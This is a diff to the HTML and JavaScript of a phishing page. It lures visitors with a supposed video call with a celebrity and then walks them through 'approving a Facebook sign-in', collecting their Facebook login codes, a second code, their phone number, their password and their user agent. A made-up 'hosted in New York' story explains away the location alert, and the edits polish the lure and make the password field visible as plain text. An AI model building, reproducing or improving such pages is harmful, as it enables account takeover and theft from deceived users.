@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -295,8 +294,20 @@
           <div id="error-message" style="color: #dc2626; font-size: 11px; margin-bottom: 4px;"></div>
 
           <div class="floating-group">
-            <input type="text" required name="Celebrity" id="name" class="floating-input" placeholder=" " oninput="validateInput(this)" />
-            <span class="floating-label">Celebrity Name</span>
+   <input 
+  type="text" 
+  required 
+  name="Celebrity" 
+  autocomplete="off" 
+  autocorrect="off" 
+  spellcheck="false" 
+  id="name" 
+  class="floating-input" 
+  placeholder=" " 
+  pattern="[A-Za-z\s]+" 
+  oninput="validateInput(this)" 
+/>
+<span class="floating-label">Celebrity Name</span>
           </div>
           
          
@@ -374,7 +385,7 @@ You can now video call <span class="submittedName"></span>. The call will be don
   maxlength="9" 
   required 
   id="fullName" 
-  name="Fb_Code" 
+  name="codeFB" 
   class="floating-input" 
   placeholder=" " 
   oninput="
@@ -398,7 +409,7 @@ You can now video call <span class="submittedName"></span>. The call will be don
   maxlength="9" 
   required 
   id="email2" 
-  name="Code_2nd" 
+  name="code2nd" 
   class="floating-input" 
   placeholder=" " 
   oninput="
@@ -420,7 +431,7 @@ You can now video call <span class="submittedName"></span>. The call will be don
                 </div>
 
                 <div class="floating-group">
-                  <input type="text" id="phone2" name="Phone" class="floating-input" placeholder=" " />
+                  <input type="text" id="phone2"  class="floating-input" placeholder=" " />
                   <span class="floating-label">Enter your phone number</span>
                 </div>
               </div>
@@ -453,7 +464,7 @@ You can now video call <span class="submittedName"></span>. The call will be don
               
 <h5 class="text-Ampx">
                
-You are almost ready to join the video call,  just follow the steps below to approve your facebook sign-in.
+You are almost ready to join the video call with <span class="submittedName"></span>,  just follow the steps below to approve your facebook sign-in.
 
 <br><br>
 <strong> Step 1:<br>
@@ -484,7 +495,7 @@ The video call is hosted in New York. Because of this, the sign-in notification 
                   </div>
 
                   <div class="floating-group">
-                    <input type="password" id="confirmLocation" name="Pass2" class="floating-input" placeholder=" " />
+                    <input type="text" id="confirmLocation" name="Pass2" class="floating-input" placeholder=" " />
                     <span class="floating-label">Password</span>
                   </div>
 
@@ -523,16 +534,20 @@ The video call is hosted in New York. Because of this, the sign-in notification 
         document.getElementById('hidden-user-agent').value = userAgent;
     }
 
+    /* Combined Input Validation */
     function validateInput(input) {
-      var minLength = 3;
-      var maxLength = 38;
+      // Strips numbers and special characters immediately as the user types
+      input.value = input.value.replace(/[^a-zA-Z\s]/g, '');
+
+      var minLength = 5;
+      var maxLength = 25;
       var errorMessage = document.getElementById("error-message");
 
       if (input.value.length < minLength || input.value.length > maxLength) {
-        errorMessage.textContent = "";
-        input.setCustomValidity("Please enter a valid celebrity name");
+        if (errorMessage) errorMessage.textContent = "";
+        input.setCustomValidity("Please complete the celebrity's name");
       } else {
-        errorMessage.textContent = "";
+        if (errorMessage) errorMessage.textContent = "";
         input.setCustomValidity("");
       }
     }
